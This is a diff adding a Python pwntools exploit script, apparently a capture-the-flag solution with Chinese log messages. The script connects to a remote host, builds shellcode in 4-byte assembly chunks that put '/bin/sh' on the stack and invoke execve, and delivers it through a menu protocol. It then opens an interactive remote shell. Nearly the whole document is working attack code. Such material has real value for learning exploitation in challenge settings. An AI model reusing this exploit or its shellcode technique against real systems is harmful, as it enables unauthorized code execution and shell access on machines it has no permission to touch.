@@ -1,0 +1,98 @@
+import platform
+from pwn import *
+import sys
+context(arch='amd64', os='linux', log_level='debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+def setup_network_connection():
+
+    try:
+        connection = remote('101.200.155.151', 12800)
+        log.info("成功连接到远程服务器")
+        return connection
+    except Exception as e:
+        log.error(f"连接远程服务器失败: {e}")
+        sys.exit(1)
+
+def generate_code_block(assembly_code):
+    
+    try:
+        machine_code = asm(assembly_code)
+        if len(machine_code) > 4:
+            log.error(f"代码太长（最大4字节）: {assembly_code}")
+            return None
+        
+        machine_code = machine_code.ljust(4, b'\x90')
+        payload_segment = p64(0x114f00) + p32(0) + p32(1)
+        payload_segment += p64(0x114f00) + p32(0) + machine_code
+        return payload_segment
+    except Exception as e:
+        log.error(f"汇编代码 '{assembly_code}' 时出错: {e}")
+        return None
+
+def construct_payload():
+    """构建完整的shellcode有效载荷"""
+    
+    full_payload = b"saki,stop".ljust(0x20, b'\x00') 
+    full_payload += p64(0) + p64(0x1011)  
+    shellcode_instructions = [
+        "mov al, 0x68",
+        "shl rax, 0x10",
+        "add ax, 0x732f",
+        "shl rax, 0x10",
+        "add ax, 0x6e69",
+        "shl rax, 0x10",
+        "add ax, 0x622f",
+        "push rax",
+        "xor rax, rax",
+        "mov rdi, rsp",
+        "mov al, 0x3b",  
+        "syscall"
+    ]
+    
+    for instruction in shellcode_instructions:
+        code_chunk = generate_code_block(instruction)
+        if not code_chunk:
+            return None
+        full_payload += code_chunk
+    
+    return full_payload
+
+def main():
+    try:
+        
+        conn = setup_network_connection()
+        
+        
+        final_shellcode = construct_payload()
+        if not final_shellcode:
+            log.error("构建shellcode失败")
+            return
+        
+        
+        conn.recvuntil("her\n")
+        initial_packet_count = (len(final_shellcode) - 0x30) // 0x10
+        log.info(f"发送 {initial_packet_count} 个初始数据包")
+        
+        
+        for _ in range(initial_packet_count):
+            conn.sendline(b"saki,ido")
+            conn.sendline("1")
+        log.info("发送最终有效载荷")
+        conn.sendline(final_shellcode)
+        log.info("切换到交互模式")
+        conn.interactive()
+
+    except EOFError:
+        log.error("连接意外关闭")
+    except KeyboardInterrupt:
+        log.info("由于用户中断而退出")
+    except Exception as e:
+        log.error(f"发生意外错误: {e}")
+    finally:
+        if 'conn' in locals():
+            conn.close()
+            log.info("连接已关闭")
+            
+if __name__ == "__main__":
+    main()
